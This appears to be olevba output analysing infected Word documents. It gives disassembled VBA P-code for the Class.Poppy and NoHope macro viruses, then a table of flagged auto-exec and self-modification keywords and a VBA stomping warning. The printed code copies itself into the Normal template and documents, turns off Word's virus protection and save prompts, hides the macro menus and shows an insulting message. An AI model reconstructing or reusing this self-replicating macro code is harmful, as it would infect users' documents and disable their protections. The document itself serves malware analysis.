' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #119:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #120:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #121:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #122:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #123:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #124:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #125:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #128:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #129:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #130:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I Think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0021 "VicodinES Loves You / Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #131:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #132:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #133:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #134:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #135:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #136:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #137:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #138:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #139:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #140:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #142:
' 	EndWith 
' Line #143:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #144:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #146:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #147:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #148:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #149:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #150:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #151:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #152:
' 	EndWith 
' Line #153:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #156:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd CodeModule 
' 	With 
' Line #157:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #158:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #159:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #160:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #161:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #162:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #163:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #164:
' 	EndWith 
' Line #165:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #166:
' 	Label out 
' Line #167:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #168:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #169:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #170:
' 	EndSub 
' Line #171:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #172:
' 	QuoteRem 0x0000 0x003E "Tina09/02/2000 09:16:15HP LaserJet 6L on LPT1:CURRICULUM VITAE"
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall Document_Close 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #177:
' 	QuoteRem 0x0000 0x0041 "withered rope you hang what's empty can't remain to put it simply"
' Line #178:
' 	FuncDefn (Private Sub Document_Close())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #179:
' 	QuoteRem 0x0000 0x0042 "in time cry the hollow words to sing with false disguise smothered"
' Line #180:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #181:
' 	QuoteRem 0x0000 0x0040 "hope fly from sorrow for a new divine tomorrow i just don't want"
' Line #182:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #183:
' 	QuoteRem 0x0000 0x0042 "to know anymore life shifts up and down everybody knows it's wrong"
' Line #184:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set CM 
' Line #185:
' 	QuoteRem 0x0000 0x0041 "why don't you care? now do it seem fair? it's not in the rhyme or"
' Line #186:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set ad 
' Line #187:
' 	QuoteRem 0x0000 0x003D "reason so it goes with every season crawl to top fall through"
' Line #188:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set nt 
' Line #189:
' 	QuoteRem 0x0000 0x0041 "bottom first hand love is really rotten slice of life find what's"
' Line #190:
' 	LitDI2 0x0001 
' 	Ld CM 
' 	MemLd CountOfLines 
' 	Ld CM 
' 	ArgsMemLd Lines 0x0002 
' 	St MC 
' Line #191:
' 	QuoteRem 0x0000 0x003F "plenty inch towards a sanctuary light with me inside the womb i"
' Line #192:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	ArgsMemCall deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld MC 
' 	Ld ad 
' 	ArgsMemCall AddFromString 0x0001 
' Line #193:
' 	QuoteRem 0x0000 0x003D "know everyone everybody knows it's me it's my voice, my voice"
' Line #194:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	ArgsMemCall deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld MC 
' 	Ld nt 
' 	ArgsMemCall AddFromString 0x0001 
' Line #195:
' 	QuoteRem 0x0000 0x003D "cries out obscenity sightless eye regard my past sometimes it"
' Line #196:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #197:
' 	QuoteRem 0x0000 0x0029 "should i just don't want to know anymore."
' Line #198:
' 	EndSub 
' Line #199:
' 	QuoteRem 0x0000 0x003D "NoHope~By~Lys~KovicK Lyrics From Smothered Hope(Skinny Puppy)"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

